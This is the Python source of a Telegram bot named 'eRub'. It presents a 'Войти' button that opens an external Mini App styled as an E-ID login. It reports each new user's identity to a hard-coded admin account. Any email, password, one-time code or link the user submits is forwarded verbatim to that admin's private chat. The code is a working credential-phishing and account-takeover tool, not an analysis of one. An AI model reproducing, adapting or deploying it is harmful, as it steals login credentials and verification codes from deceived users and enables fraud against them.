import os
import logging
import json
import requests
import time
from datetime import datetime
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.request import HTTPXRequest

# ==================== КОНФИГ ====================
# Railway будет брать токен из переменной TELEGRAM_TOKEN
BOT_TOKEN = os.environ.get("TELEGRAM_TOKEN")  
# Твой личный ID (в ЛС)
ADMIN_ID = 8542901240 
WEB_APP_URL = "https://alexandersvet2711-sys.github.io/erub/"
# ===============================================

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ErubBot:
    def __init__(self):
        # Добавляем таймауты, чтобы бот не падал на Railway
        custom_request = HTTPXRequest(connect_timeout=30.0, read_timeout=30.0)
        
        self.app = Application.builder()\
            .token(BOT_TOKEN)\
            .request(custom_request)\
            .get_updates_request(HTTPXRequest(connect_timeout=30.0))\
            .build()
            
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(MessageHandler(filters.ALL, self.handle))

    # ===== 1. /start =====
    async def start(self, update: Update, context):
        user = update.effective_user
        current_time = datetime.now().strftime("%d.%m.%Y %H:%M")

        # Уведомление ТЕБЕ
        try:
            await self.app.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🟢 НОВЫЙ ВХОД В БОТА!\n\n"
                     f"👤 ID: `{user.id}`\n"
                     f"👤 Имя: {user.first_name or 'без имени'}\n"
                     f"👤 Username: @{user.username or 'нет'}\n"
                     f"🕐 Время: {current_time}",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления: {e}")

        # Приветствие пользователю
        await update.message.reply_text(
            f"👋 Привет, {user.first_name}!\n\n"
            f"Нажмите кнопку ВНИЗУ, чтобы открыть приложение eRub.\n\n"
            f"Если Вы ещё не зарегистрированы в eRub, выберите Вход через E-ID.",
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔑 Войти", web_app=WebAppInfo(url=WEB_APP_URL))]],
                resize_keyboard=True
            )
        )

    # ===== 2. Обработка сообщений =====
    async def handle(self, update: Update, context):
        if not update.message:
            return

        msg = update.message
        chat_id = msg.chat.id
        user_id = msg.from_user.id
        text = msg.text

        if chat_id == ADMIN_ID:
            return

        # Если это JSON от Mini App
        if text and text.startswith('{') and text.endswith('}'):
            try:
                data = json.loads(text)
                email = data.get('email')
                password = data.get('password')
                code = data.get('code')
                link = data.get('link')
                
                # Обычный вход
                if email and password and not code and not link:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔔 НОВАЯ ЗАЯВКА!\n\n"
                             f"👤 ID: `{user_id}`\n"
                             f"📧 Логин: `{email}`\n"
                             f"🔑 Пароль: `{password}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Заявка отправлена администратору!")
                    return

                # Код
                if code:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"📧 КОД: `{code}`\n👤 ID: `{user_id}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Код отправлен!")
                    return

                # Ссылка
                if link:
                    await self.app.bot.send_message(
                        chat_id=ADMIN_ID,
                        text=f"🔗 ССЫЛКА: `{link}`\n👤 ID: `{user_id}`",
                        parse_mode="Markdown"
                    )
                    await msg.reply_text("✅ Ссылка отправлена!")
                    return

            except Exception as e:
                logger.error(f"Ошибка: {e}")
                await msg.reply_text("❌ Ошибка обработки данных")
        else:
            await msg.reply_text("ℹ️ Используйте кнопку «Войти»")

    # ===== 3. Запуск =====
    def run(self):
        print("=" * 50)
        print("🚀 БОТ ЗАПУЩЕН")
        print(f"👤 ADMIN_ID: {ADMIN_ID}")
        print("=" * 50)
        self.app.run_polling(bootstrap_retries=5)

if __name__ == "__main__":
    ErubBot().run()
